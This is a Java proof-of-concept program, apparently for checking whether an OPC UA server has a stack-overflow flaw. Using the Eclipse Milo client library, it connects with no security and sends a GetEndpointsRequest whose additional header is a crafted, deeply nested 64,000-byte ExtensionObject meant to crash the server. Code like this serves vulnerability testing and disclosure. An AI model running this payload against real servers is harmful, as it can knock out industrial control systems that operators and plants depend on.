package com.digitalpetri.opcua;

import java.io.File;

import org.eclipse.milo.opcua.stack.client.UaStackClient;
import org.eclipse.milo.opcua.stack.client.UaStackClientConfig;
import org.eclipse.milo.opcua.stack.core.Identifiers;
import org.eclipse.milo.opcua.stack.core.Stack;
import org.eclipse.milo.opcua.stack.core.security.SecurityPolicy;
import org.eclipse.milo.opcua.stack.core.types.builtin.ByteString;
import org.eclipse.milo.opcua.stack.core.types.builtin.DateTime;
import org.eclipse.milo.opcua.stack.core.types.builtin.ExtensionObject;
import org.eclipse.milo.opcua.stack.core.types.enumerated.MessageSecurityMode;
import org.eclipse.milo.opcua.stack.core.types.structured.EndpointDescription;
import org.eclipse.milo.opcua.stack.core.types.structured.GetEndpointsRequest;
import org.eclipse.milo.opcua.stack.core.types.structured.RequestHeader;

import static org.eclipse.milo.opcua.stack.core.types.builtin.unsigned.Unsigned.ubyte;
import static org.eclipse.milo.opcua.stack.core.types.builtin.unsigned.Unsigned.uint;

public class StackOverflowPoc {

    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            File jarFile = new File(
                StackOverflowPoc.class.getProtectionDomain()
                    .getCodeSource()
                    .getLocation()
                    .getPath()
            );

            System.err.printf("usage: java -jar %s <endpointUrl>\n", jarFile.getName());
            System.exit(-1);
        }

        String endpointUrl = args[0];

        EndpointDescription endpoint = new EndpointDescription(
            endpointUrl,
            null,
            null,
            MessageSecurityMode.None,
            SecurityPolicy.None.getUri(),
            null,
            Stack.TCP_UASC_UABINARY_TRANSPORT_URI,
            ubyte(0)
        );

        UaStackClientConfig config = UaStackClientConfig.builder()
            .setEndpoint(endpoint)
            .build();

        UaStackClient stackClient = UaStackClient.create(config);
        stackClient.connect().get();

        int x = 64000;
        byte[] bs = new byte[16 + x + 8];
        for (int i = 0; i < x; i++) {
            bs[i + 16] = 64;
        }

        ExtensionObject additionalHeader = new ExtensionObject(
            ByteString.of(bs),
            Identifiers.ResponseHeader_Encoding_DefaultBinary
        );

        RequestHeader requestHeader = new RequestHeader(
            null,
            DateTime.now(),
            uint(0),
            uint(0),
            null,
            uint(0),
            additionalHeader
        );

        GetEndpointsRequest request = new GetEndpointsRequest(
            requestHeader,
            endpointUrl,
            null,
            null
        );

        stackClient.sendRequest(request).get();

        System.out.println("Received GetEndpointsResponse; not likely vulnerable.");
    }

}
